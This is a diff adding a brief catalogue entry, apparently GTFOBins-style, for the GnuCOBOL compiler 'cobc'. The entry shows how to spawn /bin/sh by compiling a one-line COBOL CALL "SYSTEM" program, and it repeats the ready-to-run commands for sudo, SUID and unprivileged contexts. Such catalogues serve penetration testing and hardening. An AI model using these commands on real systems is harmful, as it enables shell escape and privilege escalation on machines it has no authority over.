@@ -1,0 +1,20 @@
+cobc
+====
+
+Shell
+-----
+
+[Sudo]
+    echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+cobc -xFj --frelax-syntax-checks /path/to/temp-file
+    The `/path/to/temp-file` sill be overwritten after the execution.
+
+[SUID]
+    echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+cobc -xFj --frelax-syntax-checks /path/to/temp-file
+    The `/path/to/temp-file` sill be overwritten after the execution.
+
+[Unprivileged]
+    echo 'CALL "SYSTEM" USING "/bin/sh".' >/path/to/temp-file
+cobc -xFj --frelax-syntax-checks /path/to/temp-file
+    The `/path/to/temp-file` sill be overwritten after the execution.
